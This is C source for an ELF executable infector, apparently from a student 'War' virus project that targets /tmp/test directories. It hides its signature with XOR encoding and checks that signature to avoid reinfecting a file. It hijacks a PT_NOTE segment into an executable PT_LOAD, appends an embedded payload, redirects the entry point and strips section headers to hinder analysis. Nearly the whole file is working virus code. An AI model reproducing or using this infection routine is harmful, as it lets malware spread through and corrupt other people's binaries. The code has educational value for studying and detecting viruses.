#define _GNU_SOURCE

#include "../incl/war.h"
#include "payload.h"

static unsigned char g_signature[] = {
    0x15, 0x23, 0x30, 0x62, 0x34, 0x27, 0x30, 0x31,
    0x2b, 0x2d, 0x2c, 0x62, 0x73, 0x6c, 0x72, 0x62,
    0x6a, 0x21, 0x6b, 0x2d, 0x26, 0x27, 0x26, 0x62,
    0x0d, 0x21, 0x36, 0x62, 0x6f, 0x62, 0x70, 0x72,
    0x70, 0x74, 0x62, 0x20, 0x3b, 0x62, 0x26, 0x23,
    0x34, 0x25, 0x23, 0x2e, 0x2e, 0x27, 0x62, 0x6f,
    0x62, 0x00
};

void    ft_obfuscation(t_war *war)
{
    int i = 0;
    while (g_signature[i])
    {
        war->decrypted[i] = g_signature[i] ^ KEY;
        i++;
    }
    war->decrypted[i] = '\0';
}

void    ft_update_payload(t_war *war, char *str, int count)
{
    off_t   offset;
    int     fd;

    offset = (unsigned char *)war->signd - war->elf;
    offset += count;
    
    fd = open(war->binary, O_RDWR);
    if (fd == -1)
        return;
    if (lseek(fd, offset, SEEK_SET) == -1)
    {
        close(fd);
        return;
    }
    write(fd, str, strlen(str));
    close(fd);
    return;
}

void    ft_polymorphism(t_war *war)
{
    char    *buffer;
    char    *aux = war->signd;
    int     value = 0;
    int     start = ft_strlen(war->decrypted);
    int     offset = start;
    int     len = ft_couter(war->signd, start) + 1;

    buffer = malloc(len);
    if (!buffer)
        return;
    while (aux[offset] != '\0')
    {
        buffer[value] = aux[offset];
        value++;
        offset++;
    }
    buffer[value] = '\0';
    value = 0;
    value = atoi(buffer);
    value++;
    snprintf(buffer, len, "%05d", value);
    ft_update_payload(war, buffer, start);
    free(buffer);
}

char    *ft_getdir(int i)
{
    if (i == 0)
        return ("/tmp/test");
    return ("/tmp/test2");
}

int     ft_is_infection(t_war *war)
{
    ft_obfuscation(war);
    war->signd = memmem(war->elf, war->file_size, war->decrypted, strlen(war->decrypted));
    if (war->signd)
    {
        ft_polymorphism(war);
        return (1);
    }
    return (0);
}

void    ft_infect(t_war *war)
{
    unsigned char   *payload;
    char            full_signature[1069];
    uint64_t        new_vaddr;
    Elf64_Phdr      *phdr;
    Elf64_Addr      new_entry;
    off_t           insertion_point;
    off_t           aligned_insertion;
    Elf64_Half      e_phnum_save = 0;
    Elf64_Phdr      *phdr_table_copy = NULL;
    size_t          sig_len;
    int             i = 0;
    int             note_index = -1;

    // 1. Reservar y cargar el binario plano del payload
    payload = malloc(src_payload_bin_len);
    if (!payload)
        return;
    memcpy(payload, src_payload_bin, src_payload_bin_len);

    // 2. Obtener la tabla de Program Headers
    phdr = (Elf64_Phdr *)(war->elf + war->header->e_phoff);

    // 3. Buscar un segmento PT_NOTE para secuestrarlo
    while (i < war->header->e_phnum)
    {
        if (phdr[i].p_type == PT_NOTE && note_index == -1)
        {
            note_index = i;
            break;
        }
        i++;
    }

    if (note_index == -1)
    {
        munmap(war->elf, war->file_size);
        close(war->fd);
        free(payload);
        return;
    }

    // 4. Calcular el EOF y alinear estrictamente a 0x1000 (4KB) para ld.so
    insertion_point = war->file_size;
    aligned_insertion = (insertion_point + 0xfff) & ~0xfff;

    // Buscar la dirección virtual máxima existente para colocar la nuestra limpia
    uint64_t max_vaddr = 0;
    for (int j = 0; j < war->header->e_phnum; j++)
    {
        if (phdr[j].p_type == PT_LOAD)
        {
            uint64_t end_vaddr = phdr[j].p_vaddr + phdr[j].p_memsz;
            if (end_vaddr > max_vaddr)
                max_vaddr = end_vaddr;
        }
    }
    
    // Alinear la nueva dirección virtual a una página limpia por encima de todo
    new_vaddr = (max_vaddr + 0xfff) & ~0xfff;
    e_phnum_save = war->header->e_phnum;

    // 5. Preparar la firma real
    snprintf(full_signature, sizeof(full_signature), "%s39774", war->decrypted);
    sig_len = strlen(full_signature);

    // 6. Parchear el salto delta en el payload
    uint64_t entry_delta = war->header->e_entry - new_vaddr;
    memcpy(payload + 2, &entry_delta, sizeof(uint64_t));

    // 6b. parchear el offset de la firma en el payload (sig_offset, offset 10)
    uint64_t sig_off = aligned_insertion + src_payload_bin_len;   // ← aligned_insertion, no insertion_point
    memcpy(payload + 10, &sig_off, sizeof(uint64_t));
    
    // 7. SECUESTRAR PT_NOTE Y CONVERTIRLO EN PT_LOAD VÁLIDO Y ALINEADO
    phdr[note_index].p_type = PT_LOAD;
    phdr[note_index].p_flags = PF_R | PF_X; // Lectura y Ejecución (cero escritura)
    phdr[note_index].p_offset = aligned_insertion;
    phdr[note_index].p_vaddr = new_vaddr;
    phdr[note_index].p_paddr = new_vaddr;
    phdr[note_index].p_filesz = src_payload_bin_len + sig_len;
    phdr[note_index].p_memsz = phdr[note_index].p_filesz;
    phdr[note_index].p_align = 0x1000;

    // 8. Redirigir el punto de entrada global directamente al payload
    war->header->e_entry = new_vaddr;
    new_entry = war->header->e_entry;

    // 9. Anular limpiamente todas las Section Headers
    //war->header->e_shoff = 0;
    war->header->e_shnum = 0;
    war->header->e_shentsize = 0;
    war->header->e_shstrndx = 0;

    // 10. Copiar program headers modificados
    phdr_table_copy = malloc(e_phnum_save * sizeof(Elf64_Phdr));
    if (phdr_table_copy)
        memcpy(phdr_table_copy, phdr, e_phnum_save * sizeof(Elf64_Phdr));

    // 11. Desmontar el mapeo antiguo y reabrir descriptor en escritura
    munmap(war->elf, war->file_size);
    close(war->fd);

    war->fd = open(war->binary, O_RDWR | O_NOFOLLOW);
    if (war->fd == -1)
    {
        free(payload);
        free(phdr_table_copy);
        return;
    }

    // ==========================================
    // ESCRITURA ATÓMICA EN DISCO
    // ==========================================

    // A. Escribir nuevo e_entry (offset 24)
    lseek(war->fd, 24, SEEK_SET);
    write(war->fd, &new_entry, sizeof(Elf64_Addr));

    // B. Poner a cero e_shoff (offset 40)
    Elf64_Off zero_off = 0;
    lseek(war->fd, 40, SEEK_SET);
    write(war->fd, &zero_off, sizeof(Elf64_Off));

    // C. Poner a cero e_shentsize (58), e_shnum (60) y e_shstrndx (62)
    uint16_t zero_word = 0;
    lseek(war->fd, 58, SEEK_SET);
    write(war->fd, &zero_word, sizeof(uint16_t));
    write(war->fd, &zero_word, sizeof(uint16_t));
    write(war->fd, &zero_word, sizeof(uint16_t));

    // D. Reescribir tabla de Program Headers modificada (offset 64)
    if (phdr_table_copy)
    {
        lseek(war->fd, 64, SEEK_SET);
        write(war->fd, phdr_table_copy, e_phnum_save * sizeof(Elf64_Phdr));
    }

    // E. Rellenar con ceros (padding) desde el EOF original hasta aligned_insertion si hay diferencia
    if (aligned_insertion > insertion_point)
    {
        size_t pad_len = aligned_insertion - insertion_point;
        char *pad = calloc(1, pad_len);
        if (pad)
        {
            lseek(war->fd, insertion_point, SEEK_SET);
            write(war->fd, pad, pad_len);
            free(pad);
        }
    }

    // F. Escribir payload en la posición exactamente alineada
    lseek(war->fd, aligned_insertion, SEEK_SET);
    write(war->fd, payload, src_payload_bin_len);

    // G. Escribir la firma limpia a continuación
    write(war->fd, full_signature, sig_len);

    // 12. Limpieza de recursos
    close(war->fd);
    free(payload);
    free(phdr_table_copy);
}